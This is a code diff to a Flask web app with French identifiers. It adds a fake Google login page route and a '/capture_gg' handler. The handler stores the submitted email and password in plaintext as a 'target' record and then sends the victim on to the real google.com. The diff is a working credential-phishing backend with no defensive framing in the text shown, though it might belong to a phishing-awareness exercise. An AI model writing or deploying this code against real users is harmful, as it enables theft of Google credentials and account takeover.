@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request, redirect, url_for, flash, session
-from app.models import Utilisateur
+from app.models import db, Cible, TemplateSite
+
 
 def register_routes(app: Flask, db):
     @app.route("/")
@@ -56,7 +57,27 @@ def register_routes(app: Flask, db):
 
         # Afficher le formulaire d'inscription si la méthode est GET
         return render_template('pyformulaire.html')
-    
-    @app.route("/pygoogle")
-    def pygoogle():
-        return render_template('pygoogle.html')
+    @app.route('/google', methods=['GET'])
+    def fake_google():
+        return render_template('fakeform.html')
+
+    @app.route('/capture_gg', methods=['POST'])
+    def capture():
+        email = request.form.get('email')
+        password = request.form.get('password')
+
+        # Récupération du template "google"
+        template = TemplateSite.query.filter_by(nom='google').first()
+
+        cible = Cible(
+            prenom=None,
+            nom=None,
+            email=email,
+            mot_de_passe=password,
+            site_id=template.id if template else None
+        )
+
+        db.session.add(cible)
+        db.session.commit()
+
+        return redirect("https://www.google.com")
